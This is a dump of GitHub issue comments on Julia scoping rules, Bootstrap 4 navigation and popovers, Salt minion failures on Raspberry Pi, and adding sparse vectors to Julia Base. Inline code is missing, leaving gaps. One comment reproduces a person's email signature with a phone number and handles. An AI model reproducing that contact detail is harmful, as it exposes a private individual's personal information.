julia/JuliaLang/28789/423157258,28789,"I've just hit this and was completely boggled to be honest, having never seen it before in any other language. I'm planning on introducing an optional Julia course for advanced R users in my uni later this year once things have settled down, and my students will hit this on day 0 when they start randomly typing things in the REPL. And the fact that  loops behave differently from  statements just rubs salt in the wound, however logical this may be in terms of scoping. Scope inside functions is sufficiently hard to get biology students to grasp, the idea of having to explain albeit perceived glaring inconsistencies in it in the REPL / in a script / in a for loop / in an if statement (because that's what we're talking about here) in a way that is different from every other language on earth makes me very sad. I understand the backward compatibility promise that was made, but having this work as expected by every non-cs person on the planet (and most cs people I suspect) seems like a bugfix rather than a backward compatibility issue - we're not saying that every bug will be reproduced for ever are we? The REPL fix is obviously essential, so it's great that you're proposing this, but then having to explain you can't copy a script into the REPL and expect the same behaviour seems as bad as or worse than the original problem. Please, please, please think about treating this as a bugfix and pushing it out with scripts as well as the REPL - even if there's an switch to go to the ""old"" behaviour - and doing it as soon as possible in 1.0.1. ",,False
julia/JuliaLang/28789/423327310,28789,A colleague that I was trying to get to learn julia also just ran into this. Having to explain the whole global vs. local variable thing at the first steps is not ideal... ,,False
julia/JuliaLang/28789/423329612,28789,"I don't think treating this as a ""bugfix"" is in the cards, because it would break the 1.0 stability contract.   However, it seems reasonable to me to use softscope for scripts run with  (i.e. ""interactive"" mode). (That is, there would be a flag  and it would default to the value of .) ",,False
julia/JuliaLang/28789/423335274,28789,We'll have to consider the script mode choice. ,,False
julia/JuliaLang/28789/423336959,28789,"For that matter, it's not crazy to me to default to  for any ""script"", i.e. for , and only turn on the ""hard"" scoping rules for modules and  (at which point you should really be putting most code into functions). ",,False
julia/JuliaLang/28789/423340022,28789,"That.  The other one to seriously consider is Juno.  Remember that people will  through their code to do interactive development(especially when working with the regression tests) and then later expect to be able to run the same file.   Should it matter if the code is in a  or not (which I think might introduce a scope)?  It would be very confusing to the user if the same text changes when in a  vs. not when using Atom's integration, and is inconsistent with doing  as well. It sure sounds to me like the best solution is that the hard-scope is simply an opt-in thing, where if every other usage (including  within scripts) uses  unless you say otherwise. ",,False
julia/JuliaLang/28789/423346801,28789,"Do you want to write  to introduce every variable? That would also ""fix"" this, and be more like other languages. That is not how this works. You can't get any change to the language you want just by calling the current behavior a bug. I reeeally don't think there should be a command line option for this. Then every piece of julia code will have to come with a comment or something telling you which option to use. Some kind of parser directive in a source file would be a bit better, but even better still would be to have a fixed rule. For example, hard scope inside modules only might make sense. Let me try again to provide an explanation of this that might be useful for avoiding the mania, hysteria, and carnage people are seeing in the classroom "" Julia has two kinds of variables local and global. Variables you introduce in the REPL or at the top level, outside of anything else, are global. Variables introduced inside functions and loops are local. Updating global variables in a program is generally bad, so if you're inside a loop or function and want to update a global, you have to be explicit about it by writing the  declaration again. "" Perhaps that can be improved; suggestions welcome. I know, you'd rather not need any sort of explanation at all. I get that. But it doesn't seem so bad to me. ",,False
julia/JuliaLang/28789/423356933,28789,"I agree.  Sounds like a teaching and communication headache to me. Just so I understand if I had a short script (not in a module!) in a  file which I had copied from an IJulia notebook, then if I ran that code in either the REPL directly or shift-enter in Juno, then it would behave consistently as soft-scope... but if I copied it instead of a  block then it would yell at me about globals?  But if I copied that code inside of functions inside of a module, then it should work. If so, that makes complete sense,is very teachable and coherent.  Top-level scripts are an interactive interface for exploration, etc. but you would never put that kind of code in a module.  Modules are something that you should fill with functions are very carefully considered globals.  It would be easy to tell people about those rules. ",,False
julia/JuliaLang/28789/423361708,28789,"No, I'd rather not! But scripting languages that have a REPL rarely do that (e.g. ruby, python, R, ...), they behave like Julia v0.6 did. I completely understand what you're saying here, and I won't (touch wood!) make this mistake again. But the whole problem I'm worried about is not me. I've found it relatively easy to introduce scope (without mentioning it directly) when I explain that variables inside functions can't see ones outside and vice-versa (even though that's more an aspiration than a fact in R!), because functions themselves are already a relatively advanced concept. But this hits much earlier in the learning curve here where we don't want anything remotely as complicated as scope to be impinging on people... Note also it's not just ""variables you introduce in the REPL or at the top level, outside of anything else, are global"" and ""variables introduced inside functions and loops are local"", it's also that variables in if statements in the REPL or at the top level are global but variables in a  are local. We end up down a rabbit-hole of ""just try it and work out for yourself whether it's local or global, good luck"". However, I agree with @friend - the proposal that ""hard scope inside modules only might make sense"" seems completely fine to me! Modules are a sufficiently advanced concept again... if soft scope works for the REPL and scripts, that's absolutely fine. ",,False
julia/JuliaLang/28789/423364338,28789,"What I'm trying to get at is that I feel a simple description of global vs. local is sufficient for early-stage teaching --- you don't even need to say the word ""scope"" (it does not occur at all in my explanation above). When you're just showing some simple expressions and loops in the REPL, you're not teaching people about testsets and you don't need an exhaustive list of the scoping behavior of everything in the language. My only point is, this change does not suddenly make it necessary to teach lots of details about the language up front. You can still ignore the vast majority of stuff about scopes, testsets, etc., and a simple line on global vs. local should suffice. ",,False
julia/JuliaLang/28789/423367678,28789,"In a world where everyone started writing all of their code from scratch, I would agree completely. The issue is that you need to teach students not just about scope, but also about understanding the scope of where they copy-pasted code they got from.  You need to teach them that if they copy-paste code that is on stackexchange within a function or a let block that they need to scan through it and find where to add ""global"" if they are pasting it into the REPL or a  file.  But if they are copying that code inside a function or into the Jupyter notebook. they shouldn't.  And if they find code inside of a stackexchange or tutorial page that has global variables in it, but they want to copy and modify that code inside of their own function, then they need to strip out the global. And then students start asking why does  create this scope they need to worry about but not other things.... ",,False
julia/JuliaLang/28789/423367796,28789,"Pop quiz in julia 0.6, is  global or local The answer is that there's no way to know, because it depends on whether a global  has been defined before. Now, you can say for sure that it is local. ",,False
julia/JuliaLang/28789/423368949,28789,"Folks, this discussion is verging on no longer being productive. Jeff knows very well that the old behavior was nice in the REPL. Who do you think designed and implemented it in the first place? We have already committed to changing the interactive behavior. A decision still needs to be made about whether a ""script"" is interactive or not. It sounds interactive when you call it ""a script"" but it sounds far less interactive when you call it ""a program""—yet they are exactly the same thing. Please keep the replies short and constructive and focused on the things which still must be decided. If there's comments that deviate from this, they may be hidden and the thread may be locked. ",,False
julia/JuliaLang/28789/423369442,28789,"One thought that I had but we dismissed as being ""too annoying"" and ""likely to cause the villagers to get out their pitchforks"" was that in non-interactive contexts, we could require a  or  annotation in ""soft scope"". That would guarantee that code from a module would work the same if pasted into the REPL. If we applied that to ""scripts""/""programs"" then the same would be true of them. ",,False
julia/JuliaLang/28789/423371393,28789,"When I was first introduced to Julia (not a long time ago, and I come from a Fortran background mostly), I was taught that ""Julia is compiled and fast at the function level, thus everything that must be efficient must be done inside functions. In the main 'program' it behaves like a scripting language"". I found that fair enough, as I cannot imagine anyone doing anything too computationally demanding without understanding that statement. Therefore, if there is any sacrifice in performance at the main program for using the same notation and constructions than in the functions, I find that totally acceptable, much more acceptable than trying to understand and teach these scoping rules and not being able to copy and paste codes from one place to another. By the way, I am a newbie in Julia yet, having chosen it to teach some high-school and undergraduate students some basics of simulations of physical systems. And I am already hopping this issue returns to the 'normal' behavior of previous versions, because it gives us quite a headache. ",,False
julia/JuliaLang/28789/423382739,28789,This conversation is locked now and only Julia committers can comment. ,,False
julia/JuliaLang/28789/427863076,28789,"@friend, what would be the plan to implement the semantics you suggested in this discourse thread, initially only in the REPL and opt-in elsewhere? It sounds like you are planning to put that directly into the lowering code (), rather than as a syntax rewriting ala SoftScope.jl?  Or would you rather have it as syntax rewriting first (modifying SoftScope to the proposed rule and converting it to a stdlib), and defer putting it into the lowering code for a later Julia release? ",,False
bootstrap/twbs/19814/151426642,19814,"I began to migrate to the Bootstrap 4. All components are successfully updated, except for navigation. How does the navigation Bootstrap 3 for smartphones image How does the navigation Bootstrap 4 for smartphones image1 or image2 What caused such an attitude to navigation? ",,False
bootstrap/twbs/19814/215161707,19814,There is a large amount of work to be done on navs still... Alpha2 is not production ready so you'll have to live with issues as v4 matures ,,False
bootstrap/twbs/19814/215163535,19814,"Well, I hope that this defect will be fixed. ",,False
bootstrap/twbs/19814/215170447,19814,"@friend It's not a defect, it's a WIP. Please close this issue since it is a duplicate of ",,False
bootstrap/twbs/19814/215197130,19814,"As @friend said, v4 is still in early alpha, and a lot of structures, styles and scripts have changed considerably/aren't finished yet - migrating to v4 already at this stage will likely bring up issues. And yes, duplicate of #17250 ",,False
bootstrap/twbs/7050/11326557,7050,"Have tried the following and a couple of other iterations.  I have jquery.js (full being brought in.  Assume I don't need bootstrap-tooltips.js AND bootstrap-popover.js as well?  Regardless, the problem isn't solved when including them.  TIA.             &lt;a data-toggle=""popover"" class=""m-btn blue rnd"" data-title= ""We are in  awwwwww"" data-content=""dolor sit amet.""&gt;Click me!&lt;/a&gt;             &lt;script type=""text/javascript""&gt;                 $(function () {                     $('body').popover({                         selector 'a[rel=""popover""], [data-toggle=""popover""]'                     });                      $('body').tooltip({                         selector 'a[rel=""tooltip""], [data-toggle=""tooltip""]'                     });                 });             &lt;/script&gt;  ",,False
bootstrap/twbs/7050/13999929,7050,This doesn't seem to be the right forum for this ? although issue is valid.  Moving to mailing list since patience wears thin on noob questions apparently. ,,False
bootstrap/twbs/7050/14013360,7050,this could be happening cause the tooltip / popover is in a btn-group or one of the input-append or input-prepend classes.. we can set a container option to help fix that problem.. ` ,,False
bootstrap/twbs/7050/14916877,7050,Duplicate of #5930. ,,False
bootstrap/twbs/7050/14917405,7050,"Thanks.  That was fixed in 2.3 (I found) and when i got jquery link code cleaned up a bit.  Now I just wrestling with keeping the popover open long enough to read and click on embedded hyperlinks within before manually shutting it down.  Best, V. On Thu, Mar 14, 2013 at 1236 PM, Chris Rebert notifications@friend.comwrote --  Vince Fulco, CFA, CAIA 612.424.5477 (universal) vfulco1@friend.com twitter vfulco app.net vfulco -- “Everything can be taken from a man but one thing the last of the human freedoms – to choose one’s attitude in any given set of circumstances, to choose one’s own way”.  --Viktor Frankel Always have your stuff when you need it with @friend. Sign up for free! ",,False
salt/saltstack/24955/90926278,24955,"After bootstrap trying to start Version I also tried with an empty minion config, but the problem remains. I am assuming(ohoh) that it should work out of the box after bootstrapping. Am I doing something wrong ? Or doesn't this version work on a PI ? ",,False
salt/saltstack/24955/115390049,24955,"@friend, is there another minion process running when you try to start a new process? ",,False
salt/saltstack/24955/115558462,24955,"@friend , no there is not. Just to be sure, i double checked. ",,False
salt/saltstack/24955/115976305,24955,"@friend, this looks like a really strange issue.  Salt itself is as portable as python, so as long as its dependencies are installed, it should work.  The best I can think of is that there may be a dependency problem that is causing the minion process to erroneously loop as you've demonstrated.  Is there any more interesting output with ?  Also, will you post the output from ?  Thanks. ",,False
salt/saltstack/24955/122077979,24955,"@friend, would you mind posting the output from  and ?  Thanks. ",,False
salt/saltstack/24955/122159439,24955,"(Also, this was output 3x during bootstrapping) ",,False
salt/saltstack/24955/122163734,24955,"There may be some dependency, upstream issues here.  Salt is pure python and I'm sure nothing in python or its standard lib could cause an .  It may be that a raspberry pi (at least an older one) may be too underpowered to run a salt minion, but I am doubtful of this.  I have been able to successfully run a salt minion on hardware with lesser capacity. ",,False
salt/saltstack/24955/138426424,24955,"I have observed the same behaviors during a reinstall on a previously-working Raspberry Pi B+. Previously I installed a Salt minion on the Pi on 2015-02-22 (I believe I also upgraded it via apt-get on 2015-04-06 although it's unclear from my notes if the new version ""took effect"" or not).  ((EDIT 2015-09-07) Regardless of whether the oldest version was still running or not, it was definitely talking to the Salt Master.) Due to filesystem corruption, on 2015-08-15 I was forced to reformat and reinstall the OS (NOOBS v1.4.1), and I noticed that running  seemed to hang no response, but no error.  Since then I've been trying various combinations of installing and reformatting, and even upgraded the Salt master, but the minion is not working properly and displays many of the behaviors commented above. For demonstration purposes, I begin with Download and install the bootstrap script Run the installer using  and it does a bunch of stuff before ending I then try (unsuccessfully) to confirm the versions of the installed software (I hit CTRL-C after about a minute of waiting) Attempt to stop the minion and restart in debug mode Eh?  It's still running? Force quit, confirm it's not running Now run the minion in a debug mode (hit CTRL-C after several minutes) Checking the contents of  shows the following Note the presence of warnings about  as was mentioned by others in this thread. During debugging, at various times I too received errors about ""Illegal operation"".  At the time I thought I had debuged that to be a matter of not running the command as sudo but I have not been able to reliably reproduce this behavior. I have also tried (and failed) to use the documented instructions to install the second-most-recent version, but it might be better to stop here and keep the focus on the current problem. Any suggestions? ",,False
salt/saltstack/24955/138427483,24955,"We ended up switching from Raspbian to Arch.  We got it working with a Pi 2 on Raspbian, but in order to support both platforms we had to move to Arch. On Sep 8, 2015 1221 AM, ""neilr8133"" notifications@friend.com wrote ",,False
salt/saltstack/24955/171631597,24955,Any news on this ? ) ,,False
salt/saltstack/24955/171720099,24955,"@friend, not that I know of.  We're working on getting through our backlog of issues. ",,False
salt/saltstack/24955/174838335,24955,"I just hit this, I had been bootstrapping pi's just fine, albeit with an older version of salt-bootstrap (2015.08.06 + mods). It seems to only be broken on the raspbian lite image for me. I've been using the offical Raspbian jessie images 2015-09-24-raspbian-jessie (works) 2015-11-21-raspbian-jessie-lite (fails) So its probably a dependency issue or a botched build of some package in the lite image. Running   gives the following output which may point to openssl, of course I might be on the wrong track.... ",,False
salt/saltstack/24955/190055218,24955,When following the latest install instructions here  will fail to run on a raspberry pi (Illegal Instruction). But after running another apt-get upgrade which unpacks python-tornado 4.2.1-1+b2 (from stretch) over 4.2.0-1~bpo8plus one (from jessie-backports) it magically works. I think the issues are from using the standard debian repo for binary packages instead of raspbian. The python-tornado package from the standard debian archive doesn't seem to want to run on armv6 which makes sense. I'll test a fresh install without using jessie-backports and if that works i'd suggest we update the documentation for install on raspbian. ,,False
salt/saltstack/24955/190601279,24955,"@friend For now, Salt Bootstrap doesn't support automatic installation on Raspbian. Try to follow installation instruction that @friend has suggested. I guess this issue could closed as a duplicate of saltstack/salt-bootstrap#695. Thanks! ",,False
salt/saltstack/24955/194189356,24955,"With the Raspberry 2b, we switch to official Debian image which fully support ARMv7.  So for us, it's ok ) ",,False
salt/saltstack/24955/194267229,24955,The Raspberry Pi 1 and 2 range are an old ARM 32 bit chip 99% of distros have dropped support for this old ARM chip.  Most (if not all) of the other single board chips run the current ARM 32bit chip   So for Raspberry Pi 1 and 2 you must get any binaries for the Raspberry Repo and not any other source.   Raspberry Pi 3 just release is current 64bit chip which will see the Raspberry Pi being able to run more distros.  I run fedora on a WandBoard which uses current 32bit chip and point the repo at the x86   and run dnf install salt* it picks up the noarch from salt the the binaries come from fedora. ,,False
salt/saltstack/24955/194286667,24955,"I think it's a real shame that salt-bootstrap does not support raspbian and all raspberry pi's out of the box. At our salt meetup (Paris), we often have people complaining about this. Note that often people want to try out at home this technology before recommending it to their boss or at work, so in my humble opinion, theses users should get the best UX possible, and for all versions of the Pi. Seeing that a project considers Pi1 or 2 as ""old"" platforms is usually perceived as ""oh, so it's meant to run on some cutting edge hardware"". I would like to keep on encouraging hobbyists to try out salt for things such as home automation like suggested in  ... it's getting harder and harder. ",,False
salt/saltstack/24955/194294778,24955,"@friend I think you're very welcome to submit PR to  for now, you're able to install Salt manually from Raspbian testing repo  simple script (few lines of Bash) could be written following this guide to perform bootstrapping exclusively for Raspbery PI. ",,False
salt/saltstack/24955/194310171,24955,"I got Puppet running on ARM, logged a case for better support and got back not supported at all, and no plans to support.  SaltStack have a good attitude towards ARM Platform. ",,False
salt/saltstack/24955/270058121,24955,"TLDR Use -P Ran into the same problem, tried the approach ""few lines of bash"" but there is also a even simpler workaround. First the bash approach (The keyserver lines are necessary at least in the current Raspbian 2016-11-25-raspbian-jessie) But as seen in  , the current default-development-branch's commit, it is already enough to specify the -P option        -P  Allow pip based installations. as then the required version will be satisfied. So this is then the currently working bash script to install salt master and minion on a Raspberry Tested on Raspbian version 2016-11-25-rasbian-jessie. ",,False
salt/saltstack/24955/413446145,24955,"This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. Thank you for your contributions. If this issue is closed prematurely, please leave a comment and we will gladly reopen the issue. ",,False
julia/JuliaLang/11324/77528674,11324,"There's been a lot of debate about whether we should incorporate sparse vectors into Julia 0.4. Here are three options  (A) Use SparseMatrixCSC to emulate a sparse vector. This, as many have pointed out in other issues, breaks the consistency with the dense arrays. It is also unnatural and inefficient.  (B) Add SparseVector to base before 0.4 is released.  The functionalities have been developed and tested in SparseVectors.jl. These functionalities are relatively simple and they don't need a long time to get mature. (#8718)  (C) Deprecate sparse vector related functions in Base, and add SparseVector to base after 0.4 is released. (#11323)   Personally, I don't like (A), and I am fine with either (B) or (C). One opinion against (B) is that there can be multiple ways to represent a sparse vector. However, IMHO, the way used in SparseVectors.jl seems to be the most natural way, and it is consistent with both CSC and COO formats. I understand that other formats may be more suitable for certain situations. For such cases, it is not difficult to develop a new sparse vector format (using a different type name of course). cc @friend @friend @friend @friend Since @friend has tagged #8718 as 0.4, and that PR was closed, I tag this as 0.4 in order to make sure that we come to a decision before 0.4 is released. ",,False
julia/JuliaLang/11324/102979460,11324,"I am in favour of (B) and to get it all right for 0.4. I don't like just removing the functionality and then adding it again later, which would break codes yet again. This will be an improvement over what already exists, IMO. ",,False
julia/JuliaLang/11324/103074784,11324,Agreed that the implementation in SparseVectors.jl is an improvement over what already exists. Don't take my objection over the maturity and name too seriously if there's a consensus for option (B). ,,False
julia/JuliaLang/11324/103280977,11324,"The ""inconsistency"" between dense and sparse arrays doesn't go away by adding a sparse vector type. Even with a sparse vector, there is still no sparse arrays for dimensions higher than two, so I don't buy the consistency argument and therefore also not the ""unnatural"" argument. It might be very useful with a sparse vector type, but I think we should focus of the class of operations that could benefit from a sparse vector type and some performance measures. ",,False
julia/JuliaLang/11324/103281942,11324,"Here's your inconsistency argument I'm repeating myself, but I don't care that sparse doesn't generalize yet. But we're doing dimensions 1 and 2, and the operations that result in one from the other, wrong. Let's just fix that for now. ",,False
julia/JuliaLang/11324/103310368,11324,"It is these kinds of inconsistencies I don't like, which make the system feel lacking. I wish we had N-d too, but that is likely to happen in JuliaSparse rather than Base. I also feel that a sparse vector will be useful with non-numeric data types as well. ",,False
julia/JuliaLang/11324/103312736,11324,"Although, for non-numeric data types, what is the type for fields not represented? The types of sparse arrays and vectors I have implemented (for database use) didn't store null or undefined fields.  For Julia, I guess you'd need type Any, and Nothing. ",,False
julia/JuliaLang/11324/103314770,11324,"@friend, the storage for a sparse vector and a 1-column CSC matrix is essentially the same, I don't think there are any performance differences. The argument is that the current semantics are wrong. ",,False
julia/JuliaLang/11324/103478854,11324,I still think that it would be useful to see examples application of sparse vectors. The indexing behavior of special matrix types is hard. It is a standard attack on the special matrix types and one of the reasons they might not fit well as subtypes of . I don't think indexing is the most important feature of sparse matrices or special matrices in general. They are mainly about  and . ,,False
julia/JuliaLang/11324/103498570,11324,One common sparse vector application  Read in a text corpus document-by-document and train a logistic regression classifier with an L1 penalty on parameters. Your parameter vector is a sparse vector and each new document (of which there should be exactly one in memory at a time) is a sparse vector. The only thing you need to do is compute dot products and update the parameter vector.  ,,False
julia/JuliaLang/11324/103510655,11324,"The SparseVectors package was initially motivated by the need to represent sparse samples in machine learning applications (@friend's example is an important case). For sparse vectors, we often want to compute dot products, compute distances between them, etc. Matrix-vector product is also very useful. ",,False
julia/JuliaLang/11324/103513656,11324,"Looks like, the general opinion is towards option (B). I will make a PR later this week. ",,False
julia/JuliaLang/11324/103518745,11324,"Thanks for the examples. I think all of them could work for vectors represented by  sparse matrices. After all, that approach works well in MATLAB, but go ahead with another type. I won't obstruct the process further. ",,False
julia/JuliaLang/11324/103519093,11324,"I preface this with the caveat that I do not do sparse linear algebra, but I have been playing with indexing a lot lately.  I've not tried this yet, either. Would it be possible to add a ""phony"" dimensionality to the CSC type, allowing it to pretend to be one or multi-dimensional?  All indexing would be reduced or expanded to its canonical two dimensions.  This will be very inefficient for high dimensional arrays, but it should be fairly easy to make it semantically correct and consistent (especially if we get #10525).  The JuliaSparse organization can provide more specialized types that are more efficient in the non-2-dimensional cases. ",,False
julia/JuliaLang/11324/103522839,11324,"Somewhat OT Since SparseVectors have decidedly numeric meaning in Julia (i.e. it is zero values that are removed, instead of null values), how would you name a package for storing efficiently sparse vectors of any type, where many values may be null? [think of JSON arrays, RDBMS rows, etc.]... Does something like that already exist, and I just haven't found it yet?  Thanks! ",,False
julia/JuliaLang/11324/103525215,11324,"Scott, check out the DataArrays.jl package. On Tue, May 19, 2015 at 829 AM, Scott P. Jones notifications@friend.com wrote ",,False
julia/JuliaLang/11324/103525789,11324,"@friend Nullable types, or DataArrays potentially. @friend that sounds finicky and more complicated than just adding a separate type for 1-d. If we're going to distinguish vectors from matrices within the type system for dense arrays, consistency really demands that we do the same for sparse. Faking it adds complexity to the CSC type, whose internals are already quite commonly used and relied upon not changing in packages. I have an application where I build up a sparse CSC matrix representation column-by-column, often reordering columns but rarely changing their contents. For this, an array-of-SparseVectors is an ideal representation. Representing this as CSC adds overhead for an extra integer field and an extra 2-element integer array for the column pointers for each object, which I'd really rather avoid since my columns have very few nonzeros on average. ",,False
julia/JuliaLang/11324/103528803,11324,"@friend, I would love to be able to vcat an array of sparse vectors to get a sparse CSC matrix. I think I'm coming around on this. ",,False
julia/JuliaLang/11324/103530635,11324,"hcat, you mean? ",,False
julia/JuliaLang/11324/103537320,11324,"Yes, hcat ",,False
julia/JuliaLang/11324/103661009,11324,"I'm going to have to disagree with you pretty strongly there. I use sparse matrices very heavily, but I do essentially zero linear algebra with them in Julia. Why? Because Julia's sparse matvec and matmul are still quite a bit slower than doing it in C++ or using MKL's sparse blas extensions, and the sparse factorizations available in Base aren't complete enough for my needs (SuiteSparse has no Bunch-Kaufman indefinite LDL^T). My sparse matrices do have linear (and often custom nonlinear) algebraic meaning, but that gets sent to a compiled solver to do all the actual work. So indexing, reductions, data structure traversal and creation within Julia is really important to me on sparse and structured array types (re #8001). I should send Jiahao an email and see about visiting MIT and working on it for a few weeks leading up to JuliaCon. Eventually Julia will be fast enough to write the solvers themselves - if I can get diagonal-D quasidefinite factorizations from Cholmod to work properly I've been meaning to write a Mehrotra QP solver as a proof-of-concept. Will be interesting to benchmark against Ipopt. ",,False
julia/JuliaLang/11324/103751502,11324,@friend is going to be travelling from now to JuliaCon. I will probably be around MIT a few days before and after JuliaCon - so would love to push on sparse matrix work in any way possible. ,,False
julia/JuliaLang/11324/103751747,11324,"@friend The CSC/CSR format is dense in one dimension. It doesn't generalize well to higher dimensions, where you really just want the COO format - representing indices as tuples. I have thought about faking it in CSC, but you just get extra overhead for processing vectors. I would love to make the two representations close enough, so that one can write generic code for iterating through either SparseMatrixCSC or SparseVector. ",,False
julia/JuliaLang/11324/103751856,11324,@friend You can store anything in Julia's sparse data structures already ` ,,False
julia/JuliaLang/11324/103763710,11324,"@friend What about the following? The problem is that Julia's sparse data structures all have 0 not be represented, but for RDBMS rows, you want NULL to not be represented.... ",,False
julia/JuliaLang/11324/103781988,11324,"Julia's sparse data structures although not strictly restricted to numeric values, have only been used with numeric values so far. Hence all the rough edges for non-numeric data. This discussion should really be on the mailing list and not here in this issue, where it is off-topic. ",,False
julia/JuliaLang/11324/103945652,11324,"Yup, I'm well aware. That's why I called them phony dimensions. My point was just that it might be easiest (as a stopgap) to allow the CSC data structure to masquerade as non-matrices. But perhaps that's naive. ",,False
julia/JuliaLang/11324/103976039,11324,"Adding A specific class for sparse vectors is not very difficult. It is largely done in a package, I will try to find some time during the weekend to make a PR. ",,False
julia/JuliaLang/11324/104034674,11324,"I'm worried that we're going to go through the same process of finding that all sorts of operations are missing or unusably slow due to using generic fallbacks that went on (is going on?) with sparse matrices for so long. If @friend and @friend are confident that this functionality is complete, then I guess we can merge this into the standard library, but we really need very complete tests for this. ",,False
julia/JuliaLang/11324/104089720,11324,"We probably will. The implementation covers enough functionality to be very useful as-is. I don't think Dahua was able to figure out how to get Coveralls turned on yet ( which I have no idea how to help with. It's getting better over time by adding new methods. My nascent idea for a proper generic solution that would be good enough to eventually close #8001 is to extend the cartesian indexing types with a sparsity-aware version, something like , and make the ""generic"" fallbacks use it where appropriate. ",,False
julia/JuliaLang/11324/104091036,11324,"What I can make sure is that all methods in SparseVectors.jl (or the PR that would be made later) are implemented in a reasonably efficient manner. However, there are many functions out there that accept AbstractArray but are implemented in a way that assumes fast random access (e.g. for i = 1length(A) ... end), these functions are doomed to work very slowly when called on sparse arrays. ",,False
julia/JuliaLang/11324/104135926,11324,"I believe this functionality is useful as is too. We will discover fallbacks to generic implementations, but we are pretty good about fixing them quickly. There is enough time in the 0.4 release cycle to get this 100% right. Let's at least start with a PR. ",,False
julia/JuliaLang/11324/104203945,11324,"@friend, it would be pretty easy to add such an iterator for sparse matrices. If you want me to help, just holler. ",,False
julia/JuliaLang/11324/104225989,11324,What about option D) move all sparse matrix/vector stuff into a package? I don't see any advantages of this being in Base despite that its there by default. I really think it would help to decouple the development of these things from Julia itself. (ref #5155) ,,False
julia/JuliaLang/11324/104313904,11324,"I have to say, I'm with @friend on this one. ",,False
julia/JuliaLang/11324/104375086,11324,"Can we finish precompiled packages first? Then we'll talk about it. For now, let's not break every package in JuliaOpt, kay? Dense linear algebra doesn't need to be in base either. Ignoring sparsity leads to way too much of this nonsense Pretending problem structure isn't important and every problem has all-to-all interactions leads to a crippled framework. Ever notice how there's no such thing as JuliaOpt for Torch? ",,False
julia/JuliaLang/11324/104381050,11324,@friend Why should that break every package in JuliaOpt? One would just have to put a  into packages that require this from 0.4 on. The reason I bring up this here is that the original suggestion of this thread is to put something from a package into base. And in my opinion this is the wrong direction. The designing of libraries should not be done in Base but outside base. So if you are not fine with removing this stuff than let me ask Why should SparseVectors be in base? What is the benefit of this? ,,False
julia/JuliaLang/11324/104386261,11324,"I mean, it WILL break everything in JuliaOpt, which we can then work around. How much effort that takes and pain it causes is contingent on how cleanly the excision goes (which is an open question). There's also the issue of precompilation Tony mentioned; I'm not sure how much an external SparseArrays package would add to our load time. The question is whether that burden is outweighed by the potential gains of removing sparse matrices from Base for 0.4. ",,False
julia/JuliaLang/11324/104394617,11324,"We have various syntax changes in 0.4, why should a removal of some code matter more? This is Julia master, it should not be used for production use and thus a breakage of packages is a very natural thing during a dev cycle. The point of moving things into a package is that the maintainability is increased and further any improvement that is done is directly available to users that use stable versions of Julia. In my research lab we rely on stable Julia and thus cannot benefit from any improvement that has been made to the sparse matrix code since 0.3 has been release. If it would be in a package this unnatural coupling would be broken. Regarding the load time I don't see why sparse matrices should be more special than other packages. Note that I do use sparse matrices in a large Julia code base, so I will be equally effected. ",,False
julia/JuliaLang/11324/104399451,11324,"This is a bugfix. Read the entire thread, this is fixing a semantic inconsistency in the way the current sparse matrix implementation interacts with 1-dimensional indexing. Sparse matrices are far too large, important, and widely used to consider removing before 0.4. We're already months behind schedule, let's not make it any worse. Considering this has gone poorly every time we've tried it, I have serious reservations about doing this again until we work out how to do it more smoothly. For one thing I've suggested leaving functionality in base but moving it into independent modules instead of exporting it by default, which would leave the functionality still available but behind an import, and cause a much easier-to-deal-with breakage in packages. ",,False
julia/JuliaLang/11324/104401058,11324,"@friend @friend, I was on the fence about including sparse vectors in Base, but really this addresses a significant usability and semantics issue with the current implementation, and better yet there's already code to do so and @friend is willing to push through a PR. Agreed with @friend. Let's make the incremental improvement now and not create a huge new time sink for everyone to deal with. ",,False
julia/JuliaLang/11324/104402414,11324,"Precompilation will be addressed in time, more significant is what consequences saying ""sparse matrices are not important enough to worry about in base"" would have to the package version of sparse matrices being able to work well at all. If base Julia ignores the existence of sparse matrices and writes all routines in a way that they can only ever be efficient for dense matrices, that will be crippling. You need to rewrite all of LinAlg, every reduction, all of broadcast, all indexing and concatenation over again for every sparse matrix type. And again, squared, for all conversions and linear algebra operations between different types. We need a better framework in base first, for which SparseMatrixCSC can be the first implementation - ideally a small, pluggable one that could live out in a package, but the framework needs to exist first. ",,False
julia/JuliaLang/11324/104408031,11324,This attitude is what I object to. We had this ongoing steady stream of broken sparse matrix stuff for a long time. We are past the point where it's acceptable to have that in Base – we're trying to get rid of that kind of thing; it's certainly shouldn't be adding more of. ,,False
julia/JuliaLang/11324/104412491,11324,"Stefan, I don't understand why you think it's suddenly fixed. It isn't yet. ",,False
julia/JuliaLang/11324/104412887,11324,It's better than it used to be and I object to introducing more half-baked functionality into base. ,,False
julia/JuliaLang/11324/104413284,11324,"@friend, I think @friend's proposed PR is already or can be brought to a state that's not half baked before merging. ",,False
julia/JuliaLang/11324/104413367,11324,This isn't half-baked. Things have only gotten better by gradual improvement. Which this is a case of. ,,False
julia/JuliaLang/11324/104414890,11324,Why should being to large be an argument for not moving it in a package? Importance and widely used are pretty subjective. In my subjective opinion PyPlot is a lot more important and widely used than the sparse module. If I understand Tony correctly there will be major overhaul for the sparse module in the future (e.g. generalization to CSR matrices...) and in my opinion there is no benefit of having this development in base. It will make the development even much harder than if it would be developed in a package. Or does nobody see this point? ,,False
julia/JuliaLang/11324/104415703,11324,"@friend, I agree with you and have stated before that CSR shouldn't be developed in base, but that's not related to this PR. Sparse vectors aren't a major overhaul, they're a bugfix. ",,False
julia/JuliaLang/11324/104417284,11324,@friend This is not a PR yet but a question how to proceed. If you all want this than simply go ahead and do it. The reason I started this discussion is to show the advantages of this being in a package. And I still have not seen an argument why it would be a bad thing. ,,False
julia/JuliaLang/11324/104417336,11324,"We agree with you on everything except timeframe, and maturity of the code removal process. 0.4 shouldn't be removing any more code. 0.4 should also stop adding code that isn't fixing bugs for that matter, and try to get out the door before fall. The bug here is  returns a 1-column matrix instead of a 1-d vector, if there's a way to fix that bug before 0.4 without adding a new type or introducing some ugly fragile workarounds (#11323), speak up. #8718 was on Viral's personal wishlist to get into 0.4 for some time. There's also a non-negligible risk of the sparse code bitrotting and losing a lot of visibility if it gets moved out of base. Sparse matrices will need the right infrastructure to exist in base first (which will have to be developed here) before they can work well as a package, and just as importantly they will need enough people to maintain them or they will wither and die. ",,False
